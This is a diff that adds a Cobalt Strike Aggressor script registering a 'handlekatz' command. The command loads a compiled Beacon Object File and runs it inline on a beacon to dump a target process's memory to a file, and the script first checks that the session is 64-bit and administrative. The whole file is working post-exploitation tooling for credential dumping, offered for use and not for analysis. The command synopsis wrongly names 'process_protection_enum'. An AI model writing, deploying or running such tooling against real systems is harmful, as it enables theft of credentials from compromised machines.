@@ -1,0 +1,48 @@
+beacon_command_register(
+    "handlekatz", 
+    "Implementation of handlekatz as a BOF.", 
+    "Synopsis: process_protection_enum PID PATH_TO_DESIRED_DMP.dmp");
+
+
+sub packAndExecuteBOF {
+    local('$handle');
+    local('$file_data');
+    local('$args');
+
+    $handle = openf(script_resource("handlekatz.x64.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Argument packer
+    $args = bof_pack($1, "iz", $2, $3);
+    
+    # Task the Beacon
+    #btask($1, "HandleKatz BOF Implementation (@the_bit_diddler)");
+    #btask($1, "Attempting to gather handle to provided process: $+ $2");
+
+    # Execution with packed arguments
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+
+alias handlekatz {
+    # Handle erroneous inputs ahead of time.
+    if ( size(@_) != 3) {
+        berror($1, "This BOF takes exactly two arguments: PID and PATH_TO_DUMP.");
+        return;
+    }
+
+    # Ensure that we're in an x64 session
+    if ( !-is64 $1 ) {
+        berror($1, "This must be a 64-bit process to work effectively. Exiting.");
+        return;
+    }
+    
+    # Ensure we're in an administrative session.
+    if ( !-isadmin $1 ) {
+        berror($1, "This is not deemed to be an administrative session.");
+        return;
+    }
+
+    packAndExecuteBOF($1, $2, $3);
+}
